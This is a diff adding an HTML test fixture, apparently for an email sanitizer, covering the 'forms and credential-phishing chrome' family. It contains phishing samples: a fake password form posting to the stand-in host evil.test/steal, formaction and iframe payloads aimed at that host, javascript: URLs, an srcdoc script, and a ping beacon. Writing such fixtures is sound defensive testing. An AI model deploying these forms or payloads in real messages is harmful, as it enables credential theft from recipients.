@@ -1,0 +1,30 @@
+<!-- family: forms and other credential-phishing chrome.
+     None of this executes script; all of it turns a message into a
+     convincing input surface pointed at someone else's server, which is the
+     actual threat model for mail. <form>, every control, and <iframe> are
+     in CLEAN_CONTENT_TAGS so the labels and placeholder text disappear with
+     the fields -- a form stripped to its bare text still reads as a login
+     box to the reader. -->
+<form action="https://evil.test/steal" method="post">
+  <label>Mailosh password</label>
+  <input type="password" name="p">
+  <input type="hidden" name="csrf" value="stolen">
+  <button type="submit">Sign in</button>
+</form>
+<form action="javascript:alert(1)"><input type="submit" value="go"></form>
+<button formaction="javascript:alert(1)">formaction on the button</button>
+<button formaction="https://evil.test/steal">formaction to a third party</button>
+<input type="image" src="https://evil.test/px.gif" formaction="https://evil.test/steal">
+<fieldset><legend>Verify your account</legend><input name="card"></fieldset>
+<select name="x"><optgroup label="g"><option value="1">one</option></optgroup></select>
+<textarea name="note">type here</textarea>
+<iframe src="https://evil.test/phish"></iframe>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<iframe src="javascript:alert(1)"></iframe>
+<frameset><frame src="https://evil.test/phish"></frameset>
+<object data="https://evil.test/x.swf" type="application/x-shockwave-flash"></object>
+<embed src="https://evil.test/x.swf">
+<applet code="Evil.class"></applet>
+<dialog open>modal chrome that is not ours</dialog>
+<a href="/x" ping="https://evil.test/ping">ping beacon</a>
+<img src="x" usemap="#m"><map name="m"><area shape="rect" coords="0,0,99,99" href="javascript:alert(1)"></map>
